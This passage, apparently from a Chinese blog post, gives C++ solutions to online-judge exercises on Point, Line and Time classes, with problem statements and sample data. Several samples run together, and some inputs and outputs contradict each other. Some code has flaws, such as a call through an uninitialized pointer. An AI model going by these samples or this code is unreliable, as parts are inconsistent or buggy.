    std::cout&lt;&lt;&quot;(&quot;&lt;&lt;line.start().x()&lt;&lt;&quot;, &quot;&lt;&lt;line.start().y()&lt;&lt;&quot;)&quot;;  
    std::cout&lt;&lt;&quot; to &quot;;  
    std::cout&lt;&lt;&quot;(&quot;&lt;&lt;line.end().x()&lt;&lt;&quot;, &quot;&lt;&lt;line.end().y()&lt;&lt;&quot;)&quot;;  
    std::cout&lt;&lt;std::endl;  
&#125;  

void showLinePoint(const Line&amp; line)  
&#123;  
    std::cout&lt;&lt;&quot;Line : &quot;;  
    line.start().showNoEndOfLine();  
    std::cout&lt;&lt;&quot; to &quot;;  
    line.end().showNoEndOfLine();  
    std::cout&lt;&lt;std::endl;  
&#125;  

void showLine(const Line&amp; line)  
&#123;  
    line.show();  
&#125;  

int main()  
&#123;  
    int num, i;  
    Point p(1, -2), q(2, -1), t;  
    t.show();  
    std::cin&gt;&gt;num;  
    Line line[num + 1];  
    for(i = 1; i &lt;= num; i++)  
    &#123;  
        line[i].readLine();  
        showLine(line[i]);  
    &#125;  
    Line l1(p, q), l2(p,t), l3(q,t), l4(l1);  
    showLineCoordinate(l1);  
    showLinePoint(l2);  
    showLinePoint(l3.setLine(l1));  
    showLineCoordinate(l4.setLine(t,q));  
    line[0].setStart(t);  
    line[0].setEnd(q);  
&#125;  1</code></pre>
<h3 id="23-平面上的点和线——Point类、Line类-VII"><a href="#23-平面上的点和线——Point类、Line类-VII" class="headerlink" title="23.平面上的点和线——Point类、Line类 (VII)"></a>23.平面上的点和线——Point类、Line类 (VII)</h3><blockquote>
<h2 id="Description-22"><a href="#Description-22" class="headerlink" title="Description"></a>Description</h2><p>在数学上，平面直角坐标系上的点用X轴和Y轴上的两个坐标值唯一确定，两点确定一条线段。现在我们封装一个“Point类”和“Line类”来实现平面上的点的操作。</p>
<p>根据“append.cc”，完成Point类和Line类的构造方法和show()方法，输出各Line对象和Point对象的构造和析构次序。</p>
<p>接口描述：</p>
<p>Point::showCounter()方法：按格式输出当前程序中Point对象的计数。</p>
<p>Point::showSum()方法：按格式输出程序运行至当前存在过的Point对象总数。</p>
<p>Line::showCounter()方法：按格式输出当前程序中Line对象的计数。</p>
<p>Line::showSum()方法：按格式输出程序运行至当前存在过的Line对象总数。</p>
<h2 id="Input-22"><a href="#Input-22" class="headerlink" title="Input"></a>Input</h2><p>输入的第一行为N，表示后面有N行测试样例。</p>
<p>每行为两组坐标“x,y”，分别表示线段起点和终点的x坐标和y坐标，两组坐标间用一个空格分开，x和y的值都在double数据范围内。</p>
<h2 id="Output-22"><a href="#Output-22" class="headerlink" title="Output"></a>Output</h2><p>输出格式见sample。</p>
<p>C语言的输入输出被禁用。</p>
<h2 id="Sample-Input-22"><a href="#Sample-Input-22" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>40,0 1,11,1 2,32,3 4,50,1 1,0</p>
<h2 id="Sample-Output-22"><a href="#Sample-Output-22" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Current : 3 points.In total : 3 points.Current : 6 lines.In total : 6 lines.Current : 17 points.In total : 17 points.Current : 6 lines.In total : 7 lines.Current : 15 points.In total : 17 points.Current : 6 lines.In total : 8 lines.Current : 17 points.In total : 21 points.Current : 6 lines.In total : 9 lines.Current : 15 points.In total : 21 points.Current : 6 lines.In total : 10 lines.Current : 17 points.In total : 25 points.Current : 6 lines.In total : 11 lines.Current : 15 points.In total : 25 points.Current : 6 lines.In total : 12 lines.Current : 17 points.In total : 29 points.Current : 6 lines.In total : 13 lines.Current : 15 points.In total : 29 points.Current : 9 lines.In total : 17 lines.Current : 21 points.In total : 37 points.Current : 13 lines.In total : 21 lines.Current : 21 points.In total : 45 points.</p>
<h2 id="HINT-22"><a href="#HINT-22" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-22"><a href="#Append-Code-22" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1333&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
using namespace std;
#include &lt;iomanip&gt;
class Point&#123;
private:
    double x_,y_;
    friend class Line;
    static int sta1;
    static int sta2;
public:
    Point(double x,double y)
    &#123;
        x_ = x;
        y_ = y;
        sta1++;
        sta2++;
        //cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;
    &#125;
    Point(double d)
    &#123;
        x_ = d;
        y_ = d;
        sta1++;
        sta2++;
    &#125;
    Point()
    &#123;
        x_ = 0;
        y_ = 0;
        sta1++;
        sta2++;
        //cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;
    &#125;
    void setvalue(double xx,double yy)
    &#123;
        x_ = xx;
        y_ = yy;
    &#125;
    void setx(int xx) &#123;x_ = xx;&#125;
    void sety(int yy) &#123;y_ = yy;&#125;
    void show()
    &#123;
        cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;)&quot;&lt;&lt;endl;
    &#125;
    int x() &#123; return x_;&#125;
    int y() &#123; return y_;&#125;
    Point(const Point &amp;p)
    &#123;
        sta1++;
        sta2++;
        x_ = p.x_;
        y_ = p.y_;
        //cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;) is copied.&quot;&lt;&lt;endl;
    &#125;
    ~Point()
    &#123;
       sta1 = sta1 - 1;
        //cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;) is erased.&quot;&lt;&lt;endl;
    &#125;
    static void showCounter()
    &#123;
        cout&lt;&lt;&quot;Current : &quot;&lt;&lt;sta1&lt;&lt;&quot; points.&quot;&lt;&lt;endl;
    &#125;
    static void showSum()
    &#123;
        cout&lt;&lt;&quot;In total : &quot;&lt;&lt;sta2&lt;&lt;&quot; points.&quot;&lt;&lt;endl;
    &#125;
&#125;;
 int Point::sta1(0);
 int Point::sta2(0);
class Line&#123;friend class Point;
private:
    Point x1_,y1_;
    double x1,y1,x2,y2;


public:static int sta3;
    static int sta4;
    Line(double xx1,double yy1,double xx2,double yy2):x1_(xx1,yy1),y1_(xx2,yy2)
    &#123;
        sta3++;
        sta4++;
        //cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;
    &#125;
    Line(Point &amp;q1,Point &amp;q2):x1_(q1),y1_(q2)
    &#123;
        sta3++;
        sta4++;
        //cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;
    &#125;
    Line():x1_(),y1_()&#123;sta3++; sta4++;/*cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;*/&#125;
    Line setLine(double xx3,double yy3,double xx4,double yy4)
    &#123;

        sta3++;
        sta4++;
        x1_.x_ = xx3;
        x1_.y_ = yy3;
        y1_.x_ = xx4;
        y1_.y_ = yy4;
        return *this;
    &#125;
    void show()
    &#123;
        cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;)&quot;&lt;&lt;endl;
    &#125;
    ~Line()
    &#123;
        sta3 = sta3 - 1;
        //cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;) is erased.&quot;&lt;&lt;endl;
    &#125;
    Line &amp;setLine(const Point &amp;p1,const Point &amp;p2)
    &#123;
        x1_ = p1;
        y1_ = p2;
        return *this;
    &#125;
    Line &amp;setLine(const Line&amp; q)
    &#123;
       x1_ = q.x1_;
       y1_ = q.y1_;
       return *this;
    &#125;
    void readLine()
    &#123;
       double x1,y1,x2,y2;
       char c;
       cin&gt;&gt;x1&gt;&gt;c&gt;&gt;y1&gt;&gt;x2&gt;&gt;c&gt;&gt;y2;
       x1_.x_ = x1;
       x1_.y_ = y1;
       y1_.x_ = x2;
       y1_.y_ = y2;
    &#125;
    Line(const Line &amp;b):x1_(b.x1_),y1_(b.y1_)
    &#123;
        sta3++;
        sta4++;
        //cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;) is copied.&quot;&lt;&lt;endl;
    &#125;
    static void showCounter()
    &#123;
        cout&lt;&lt;&quot;Current : &quot;&lt;&lt;sta3&lt;&lt;&quot; lines.&quot;&lt;&lt;endl;
    &#125;
    static void showSum()
    &#123;
        cout&lt;&lt;&quot;In total : &quot;&lt;&lt;sta4&lt;&lt;&quot; lines.&quot;&lt;&lt;endl;
    &#125;
&#125;;
int Line::sta3 = 0;
int Line::sta4(0);

int main()
&#123;
    int num, i;
    Point p(1, -2), q(2, -1), t;
    t.showCounter();
    t.showSum();
    std::cin&gt;&gt;num;
    Line line[num + 1];
    for(i = 1; i &lt;= num; i++)
    &#123;
        Line *l1, l2;
        l1-&gt;showCounter();
        l1-&gt;showSum();
        l1 = new Line(p, q);
        line[i].readLine();
        p.showCounter();
        p.showSum();
        delete l1;
        l2.showCounter();
        l2.showSum();
        q.showCounter();
        q.showSum();
    &#125;
    Line l1(p, q), l2(p,t), l3(q,t), l4(l1);
    Line::showCounter();
    Line::showSum();
    Point::showCounter();
    Point::showSum();
    Line *l = new Line[num];
    l4.showCounter();
    l4.showSum();
    delete[] l;
    t.showCounter();
    t.showSum();
&#125;

</code></pre>
<h3 id="24-时间类的构造和输出"><a href="#24-时间类的构造和输出" class="headerlink" title="24.时间类的构造和输出"></a>24.时间类的构造和输出</h3><blockquote>
<h2 id="Description-23"><a href="#Description-23" class="headerlink" title="Description"></a>Description</h2><p>封装一个时间类Time，用于时间处理的相关功能，支持以下操作：</p>
<p>\1. Time::Time(int,int,int)构造方法：传递时分秒的三个参数构造对象。</p>
<p>\2. Time::showTime()方法：输出“hh:mm:ss”，不足两位的要前面补0。</p>
<p>你设计一个时间类Time，使得main()函数能够正确运行。</p>
<p>函数调用格式见append.cc。</p>
<p>append.cc中已给出main()函数。</p>
<h2 id="Input-23"><a href="#Input-23" class="headerlink" title="Input"></a>Input</h2><p>输入的第一个整数n，表示有n组测试数据，每组3个整数：hh,mm,ss，分别表示时、分、秒，其值都在合法的时间范围内。</p>
<h2 id="Output-23"><a href="#Output-23" class="headerlink" title="Output"></a>Output</h2><p>每组测试数据对应一组输出“hh:mm:ss”，不足两位的输出需要前面补0，格式见sample。</p>
<h2 id="Sample-Input-23"><a href="#Sample-Input-23" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>5</p>
<p>0 0 1</p>
<p>0 59 59</p>
<p>1 1 12</p>
<p>3 0 02</p>
<p>3 59 59</p>
<h2 id="Sample-Output-23"><a href="#Sample-Output-23" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>00:00:01</p>
<p>00:59:59</p>
<p>01:01:01</p>
<p>23:00:00</p>
<p>23:59:59</p>
<h2 id="HINT-23"><a href="#HINT-23" class="headerlink" title="HINT"></a>HINT</h2><p>输出格式用头文件<iomanip>中流操作算子：</p>
<p>setw(w)   ：设置数据的输出宽度为w个字符</p>
<p>setfill(c)：设置用字符c作为填充字符</p>
<h2 id="Append-Code-23"><a href="#Append-Code-23" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1385&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Time&#123;
public:
    int h,m,s;
    Time(int hh,int mm,int ss):h(hh),m(mm),s(ss)&#123;&#125;
    void showTime()&#123;
        cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; endl;
    &#125;
&#125;;
////////////////////////////////
int main()
&#123;
    int cases;
    cin&gt;&gt;cases;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        int hour, minute, second;
        cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
        Time t(hour, minute, second);
        t.showTime();
    &#125;
&#125;</code></pre>
<blockquote>
<p>输出格式用头文件<iomanip>中流操作算子：</p>
<p>setw(w)   ：设置数据的输出宽度为w个字符</p>
<p>setfill(c)：设置用字符c作为填充字符</p>
</blockquote>
<h3 id="25-时间类的成员读写"><a href="#25-时间类的成员读写" class="headerlink" title="25.时间类的成员读写"></a>25.时间类的成员读写</h3><blockquote>
<h2 id="Description-24"><a href="#Description-24" class="headerlink" title="Description"></a>Description</h2><p>封装一个时间类Time，用于时间处理的相关功能，支持以下操作：</p>
<p>\1. Time::Time()无参构造方法。</p>
<p>\2. 成员读函数：</p>
<p>   Time::hour()  ：返回Time的小时数；</p>
<p>   Time::minute()：返回Time的分钟数；</p>
<p>   Time::second()：返回Time的秒数。</p>
<p>\3. 成员写函数：</p>
<p>   Time::hour(int)  ：传参修改Time的小时数；</p>
<p>   Time::minute(int)：传参修改Time的分钟数；</p>
<p>   Time::second(int)：传参修改Time的秒数。</p>
<p>你设计一个时间类Time，使得main()函数能够正确运行。</p>
<p>函数调用格式见append.cc。</p>
<p>append.cc中已给出main()函数。</p>
<h2 id="Input-24"><a href="#Input-24" class="headerlink" title="Input"></a>Input</h2><p>输入的第一个整数n，表示有n组测试数据，每组3个整数：hh,mm,ss，分别表示时、分、秒，其值都在合法的时间范围内。</p>
<h2 id="Output-24"><a href="#Output-24" class="headerlink" title="Output"></a>Output</h2><p>每组测试数据对应一组输出“hh:mm:ss”，不足两位的输出需要前面补0，格式见sample。</p>
<h2 id="Sample-Input-24"><a href="#Sample-Input-24" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>5</p>
<p>0 0 1</p>
<p>0 59 59</p>
<p>1 1 12</p>
<p>3 0 02</p>
<p>3 59 59</p>
<h2 id="Sample-Output-24"><a href="#Sample-Output-24" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>00:00:01</p>
<p>00:59:59</p>
<p>01:01:01</p>
<p>23:00:00</p>
<p>23:59:59</p>
<h2 id="HINT-24"><a href="#HINT-24" class="headerlink" title="HINT"></a>HINT</h2><p>输出格式用头文件<iomanip>中流操作算子：</p>
<p>setw(w)   ：设置数据的输出宽度为w个字符</p>
<p>setfill(c)：设置用字符c作为填充字符</p>
<h2 id="Append-Code-24"><a href="#Append-Code-24" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1386&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Time&#123;
public:
    int h,m,s;
    Time()&#123;&#125;
    void hour(int hh)&#123;h=hh;&#125;
    void minute(int mm)&#123;m=mm;&#125;
    void second(int ss)&#123;s=ss;&#125;
    int hour()&#123;return h;&#125;
    int minute()&#123;return m;&#125;
    int second()&#123;return s;&#125;
&#125;;
////////////////////////////////
int main()
&#123;
    Time t;
    int cases;
    cin&gt;&gt;cases;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        int hour, minute, second;
        cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
        t.hour(hour);
        t.minute(minute);
        t.second(second);
        cout&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;t.hour()&lt;&lt;&quot;:&quot;;
        cout&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;t.minute()&lt;&lt;&quot;:&quot;;
        cout&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;t.second()&lt;&lt;endl;
    &#125;
&#125;</code></pre>
<h3 id="26-时间类的输入"><a href="#26-时间类的输入" class="headerlink" title="* 26.时间类的输入"></a>* 26.时间类的输入</h3><p>Description</p>
<blockquote>
<h2 id="Description-25"><a href="#Description-25" class="headerlink" title="Description"></a>Description</h2><p>封装一个时间类Time，用于时间处理的相关功能，支持以下操作：</p>
<p>\1. Time::Time()无参构造方法。</p>
<p>\2. Time::inputTime()方法：按格式从标准输入读取数据修改Time对象的时分秒数值。该方法返回修改后的对象。</p>
<p>\3. Time::showTime()方法：输出“hh:mm:ss”，不足两位的要前面补0。</p>
<p>你设计一个时间类Time，使得main()函数能够正确运行。</p>
<p>函数调用格式见append.cc。</p>
<p>append.cc中已给出main()函数。</p>
<h2 id="Input-25"><a href="#Input-25" class="headerlink" title="Input"></a>Input</h2><p>输入的第一个整数n，表示有n组测试数据，每组3个整数：hh,mm,ss，分别表示时、分、秒，其值都在合法的时间范围内。</p>
<h2 id="Output-25"><a href="#Output-25" class="headerlink" title="Output"></a>Output</h2><p>每组测试数据对应一组输出“hh:mm:ss”，不足两位的输出需要前面补0，格式见sample。</p>
<h2 id="Sample-Input-25"><a href="#Sample-Input-25" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>50 0 10 59 591 1 123 0 023 59 59</p>
<h2 id="Sample-Output-25"><a href="#Sample-Output-25" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>00:00:0100:59:5901:01:0123:00:0023:59:59</p>
<h2 id="HINT-25"><a href="#HINT-25" class="headerlink" title="HINT"></a>HINT</h2><p>输出格式用头文件<iomanip>中流操作算子：</p>
<p>setw(w)   ：设置数据的输出宽度为w个字符</p>
<p>setfill(c)：设置用字符c作为填充字符</p>
<h2 id="Append-Code-25"><a href="#Append-Code-25" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1387&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Time&#123;
public:
    int h,m,s;
    Time()&#123;&#125;
    Time(int hh, int mm, int ss) : s(ss), m(mm), h(hh) &#123; &#125;  
    Time&amp; inputTime()  
    &#123;  
        cin &gt;&gt; h &gt;&gt; m &gt;&gt; s;  
        return *this;  
    &#125;      
    void showTime()&#123;
        cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; endl;
    &#125;
&#125;;
///////////////////////////
int main()
&#123;
    Time t;
    int cases;
    cin&gt;&gt;cases;
    for(int i = 1; i &lt;= cases; ++i)
        t.inputTime().showTime();
&#125;</code></pre>
<h3 id="27-时间类的拷贝和整体读写"><a href="#27-时间类的拷贝和整体读写" class="headerlink" title="27.时间类的拷贝和整体读写"></a>27.时间类的拷贝和整体读写</h3><blockquote>
<h2 id="Description-26"><a href="#Description-26" class="headerlink" title="Description"></a>Description</h2><p>封装一个时间类Time，用于时间处理的相关功能，支持以下操作：</p>
<p>\1. Time::Time()无参构造方法。</p>
<p>\2. Time::Time(int,int,int)构造方法：传递时分秒的三个参数构造对象。</p>
<p>\3. Time::Time(const T&amp;)拷贝构造方法。拷贝构造函数调用时输出“There was a call to the copy constructor : h,m,s”，“h,m,s”为所构造对象的时分秒数值，无需补0。</p>
<p>\4. 对象整体读写方法：</p>
<p>   Time::setTime(int,int,int)方法：传递时分秒三个参数修改Time对象的时分秒数。该方法返回修改后的对象。</p>
<p>   Time::setTime(const T&amp;)方法：传递一个参数修改Time对象的时分秒数。该方法返回修改后的对象。</p>
<p>   Time::getTime()方法：返回对象自身的引用。其实，t.getTime()即t。</p>
<p>   仅在Time类中的Time::getTime()方法实在是多余，在组合或者继承关系时才会有机会用到。</p>
<p>\5. Time::showTime()方法：输出“hh:mm:ss”，不足两位的要前面补0。</p>
<p>注意：在用Time对象传递参数时应传对象的引用而不是直接传对象，返回对象时同样返回引用，以免产生多余的对象拷贝。</p>
<p>你设计一个时间类Time，使得main()函数能够正确运行。</p>
<p>函数调用格式见append.cc。</p>
<p>append.cc中已给出main()函数。main()函数内容稍微繁复，仅为测试对象的各种调用情况。</p>
<h2 id="Input-26"><a href="#Input-26" class="headerlink" title="Input"></a>Input</h2><p>输入的第一个整数n，表示有n组测试数据，每组3个整数：hh,mm,ss，分别表示时、分、秒，其值都在合法的时间范围内。</p>
<h2 id="Output-26"><a href="#Output-26" class="headerlink" title="Output"></a>Output</h2><p>开始部分为由main()函数产生的固定输出，用于测试对象的某些方法的调用情况。输出“Test data output :”之后为测试数据对应的输出：</p>
<p>每组测试数据对应一组输出“hh:mm:ss”，不足两位的输出需要前面补0，格式见sample。</p>
<h2 id="Sample-Input-26"><a href="#Sample-Input-26" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>50 0 10 59 591 1 123 0 023 59 59</p>
<h2 id="Sample-Output-26"><a href="#Sample-Output-26" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Copy constructor test output :There was a call to the copy constructor : 0,0,0There was a call to the copy constructor : 1,2,3Test data output :00:00:0100:59:5901:01:0123:00:0023:59:59</p>
<h2 id="HINT-26"><a href="#HINT-26" class="headerlink" title="HINT"></a>HINT</h2><p>输出格式用头文件<iomanip>中流操作算子：</p>
<p>setw(w)   ：设置数据的输出宽度为w个字符</p>
<p>setfill(c)：设置用字符c作为填充字符</p>
<h2 id="Append-Code-26"><a href="#Append-Code-26" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1388&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Time&#123;
public:
    int h,m,s;
    Time():h(0),m(0),s(0)&#123;&#125;
    Time(int hh, int mm, int ss) : s(ss), m(mm), h(hh) &#123; &#125;
    Time(const Time&amp; t)&#123;h = t.h;m = t.m;s = t.s;cout &lt;&lt; &quot;There was a call to the copy constructor : &quot; &lt;&lt; h &lt;&lt; &quot;,&quot; &lt;&lt; m &lt;&lt; &quot;,&quot; &lt;&lt; s &lt;&lt; endl;&#125;
    Time &amp;setTime(int hh,int mm,int ss)  
    &#123;  
        h = hh;m = mm;s = ss;  
        return *this;  
    &#125;
    Time &amp;setTime(const Time &amp; t)  
    &#123;  
        h = t.hour();  
        m = t.minute();  
        s = t.second();  
        return *this;  
    &#125;  
    Time &amp;getTime()  
    &#123;  
        return *this;  
    &#125;  
    int hour()const&#123;return h;&#125;  
    int minute()const&#123;return m;&#125;  
    int second()const&#123;return s;&#125;  
    void showTime()&#123;
        cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; endl;
    &#125;      
&#125;;
///////////////////////////////////
int main()
&#123;
    cout&lt;&lt;&quot;Copy constructor test output :&quot;&lt;&lt;endl;
    Time t;
    Time tt(t);
    Time ttt(1, 2, 3);
    Time tttt(ttt.getTime());
    cout&lt;&lt;&quot;\nTest data output :&quot;&lt;&lt;endl;

    int cases;
    cin&gt;&gt;cases;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        if(i % 2 == 0)
        &#123;
            int hour, minute, second;
            cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
            t.setTime(hour, minute, second).showTime();
        &#125;
        if(i % 2 == 1)
        &#123;
            int hour, minute, second;
            cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
            Time tt(hour, minute, second);
            t.setTime(tt).showTime();
        &#125;
    &#125;
&#125;</code></pre>
<h3 id="28-时间类的错误数据处理"><a href="#28-时间类的错误数据处理" class="headerlink" title="28.时间类的错误数据处理"></a>28.时间类的错误数据处理</h3><blockquote>
<h2 id="Description-27"><a href="#Description-27" class="headerlink" title="Description"></a>Description</h2><p>封装一个时间类Time，用于时间处理的相关功能，支持以下操作：</p>
<p>\1. Time::Time()无参构造方法。</p>
<p>\2. Time::Time(int,int,int)构造方法：传递时分秒的三个参数构造对象。</p>
<p>\3. Time::Time(const T&amp;)拷贝构造方法。</p>
<p>\4. 成员读函数：</p>
<p>   Time::hour()  ：返回Time的小时数；</p>
<p>   Time::minute()：返回Time的分钟数；</p>
<p>   Time::second()：返回Time的秒数。</p>
<p>\5. 成员写函数：</p>
<p>   Time::hour(int)  ：传参修改Time的小时数；</p>
<p>   Time::minute(int)：传参修改Time的分钟数；</p>
<p>   Time::second(int)：传参修改Time的秒数。</p>
<p>\6. 对象整体读写方法：</p>
<p>   Time::setTime(int,int,int)方法：传递时分秒三个参数修改Time对象的时分秒数。该方法返回修改后的对象。</p>
<p>   Time::setTime(const T&amp;)方法：传递一个参数修改Time对象的时分秒数。该方法返回修改后的对象。</p>
<p>   Time::getTime()方法：返回对象自身的引用。其实，t.getTime()即t。</p>
<p>   仅在Time类中的Time::getTime()方法实在是多余，在组合或者继承关系时才会有机会用到。</p>
<p>\7. Time::inputTime()方法：按格式从标准输入读取数据修改Time对象的时分秒数值。该方法返回修改后的对象。</p>
<p>\8. Time::showTime()方法：输出“hh:mm:ss”，不足两位的要前面补0。如果对象不是合法的时间，则输出“Time error”。</p>
<p>你设计一个时间类Time，使得main()函数能够正确运行。</p>
<p>函数调用格式见append.cc。</p>
<p>append.cc中已给出main()函数。main()函数内容稍微繁复，仅为测试对象的各种调用情况。</p>
<h2 id="Input-27"><a href="#Input-27" class="headerlink" title="Input"></a>Input</h2><p>输入的第一个整数n，表示有n组测试数据，每组3个整数：hh,mm,ss，分别表示时、分、秒，其值都在int范围内。</p>
<h2 id="Output-27"><a href="#Output-27" class="headerlink" title="Output"></a>Output</h2><p>每组测试数据对应一组输出“hh:mm:ss”，不足两位的输出需要前面补0。如果输入的时间不合法，则输出“Time error”。格式见sample。</p>
<h2 id="Sample-Input-27"><a href="#Sample-Input-27" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>60 0 10 59 591 1 6023 0 023 59 5924 1 0</p>
<h2 id="Sample-Output-27"><a href="#Sample-Output-27" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>00:00:0100:59:59Time error23:00:0023:59:59Time error</p>
<h2 id="HINT-27"><a href="#HINT-27" class="headerlink" title="HINT"></a>HINT</h2><p>输出格式用头文件<iomanip>中流操作算子：</p>
<p>setw(w)   ：设置数据的输出宽度为w个字符</p>
<p>setfill(c)：设置用字符c作为填充字符</p>
<h2 id="Append-Code-27"><a href="#Append-Code-27" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1389&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Time&#123;
public:
    int h,m,s;
    Time():h(0),m(0),s(0)&#123;&#125;
    Time(int hh, int mm, int ss) : s(ss), m(mm), h(hh) &#123; &#125;
    Time(const Time&amp; t)&#123;h = t.h;m = t.m;s = t.s;cout &lt;&lt; &quot;There was a call to the copy constructor : &quot; &lt;&lt; h &lt;&lt; &quot;,&quot; &lt;&lt; m &lt;&lt; &quot;,&quot; &lt;&lt; s &lt;&lt; endl;&#125;
    Time &amp;setTime(int hh,int mm,int ss)  
    &#123;  
        h = hh;m = mm;s = ss;  
        return *this;  
    &#125;
    Time &amp;setTime(const Time &amp; t)  
    &#123;  
        h = t.hour();  
        m = t.minute();  
        s = t.second();  
        return *this;  
    &#125;  
    Time &amp;getTime()  
    &#123;  
        return *this;  
    &#125;  
    void hour(int hh)&#123;h=hh;&#125;
    void minute(int mm)&#123;m=mm;&#125;
    void second(int ss)&#123;s=ss;&#125;    
    int hour()const&#123;return h;&#125;  
    int minute()const&#123;return m;&#125;  
    int second()const&#123;return s;&#125;  
    void showTime()&#123;
        if(h &lt; 24 &amp;&amp; m &lt; 60 &amp;&amp; s &lt; 60)
            cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; endl;
        else
            cout &lt;&lt; &quot;Time error&quot; &lt;&lt; endl;
    &#125;    
    Time &amp;inputTime()&#123;
